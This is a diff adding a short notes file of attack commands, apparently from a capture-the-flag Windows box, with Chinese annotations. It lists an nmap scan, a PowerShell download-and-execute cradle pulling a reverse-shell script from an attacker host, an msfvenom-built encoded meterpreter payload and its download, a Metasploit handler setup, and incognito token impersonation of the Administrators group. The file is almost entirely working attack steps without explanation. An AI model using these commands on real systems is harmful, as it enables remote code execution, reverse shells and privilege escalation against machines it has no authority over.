@@ -1,0 +1,24 @@
+nmap 10.10.90.76 -sV -sC -Pn > nmap.txt
+
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.9.0.204/Invoke-PowerShellTcp.ps1')
+
+
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.0.204 LPORT=4444 -f exe -o reverse.exe
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.0.204/reverse.exe','reverse.exe')"
+
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.9.0.204
+set LPORT 4444
+
+
+取得meterpreter shell
+Start-process reverse.exe
+使用incognito模塊
+load incognito
+查看使用中的token
+list_tokens -g
+複製token使用
+impersonate_token "BUILTIN\Administrators"
